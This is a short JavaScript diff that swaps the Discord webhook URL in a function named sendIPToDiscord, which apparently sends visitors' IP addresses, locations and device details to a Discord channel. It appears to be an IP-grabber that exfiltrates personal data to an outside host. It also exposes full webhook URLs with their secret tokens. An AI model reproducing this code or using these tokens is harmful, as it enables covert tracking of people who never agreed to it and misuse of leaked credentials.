@@ -1,5 +1,5 @@
 function sendIPToDiscord(ipAddress, location, device) {
-    const webhookURL = "https://discord.com/api/webhooks/1153253729370390528/yF9rPCSIWl4dnXyzB1FJBw7pJz_6Cv71FRzUDMhrXoK0DZbGTL2qjsmnVGE551HSXgYa";
+    const webhookURL = "https://discord.com/api/webhooks/1153338204351639614/vjz00JC3C8Yud6s6Vh_eU-pZEF2fCSzJ1FPknuIDichMFVUvEjwoVIX8dZuK9zs3CGsK";
 
     const embedData = {
         color: 16769485,
